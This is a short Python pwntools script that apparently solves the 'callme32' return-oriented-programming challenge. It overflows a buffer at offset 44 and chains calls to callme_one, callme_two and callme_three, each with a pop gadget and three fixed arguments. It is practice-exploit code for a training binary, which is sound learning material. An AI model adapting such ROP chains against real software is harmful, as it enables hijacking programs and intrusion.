from pwn import *

# Ex: python3 template.py REMOTE shell.actf.co 21830  [nc shell.actf.co 21830]
# Ex: python3 template.py GDB
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


exe = './callme32'
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'

call_one = elf.symbols.callme_one
call_two = elf.symbols.callme_two
call_three = elf.symbols.callme_three
pop3 = ROP(elf).find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
io = start()

payload = flat({
    44: [
    	call_one,
		pop3,
		0xdeadbeef,
		0xcafebabe,
		0xd00df00d,
		call_two,
		pop3,
		0xdeadbeef,
		0xcafebabe,
		0xd00df00d,
		call_three,
		pop3,
		0xdeadbeef,
		0xcafebabe,
		0xd00df00d
    ]
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('>', payload)

io.recvuntil('callme_two() called correctly\n')
print(io.recvline())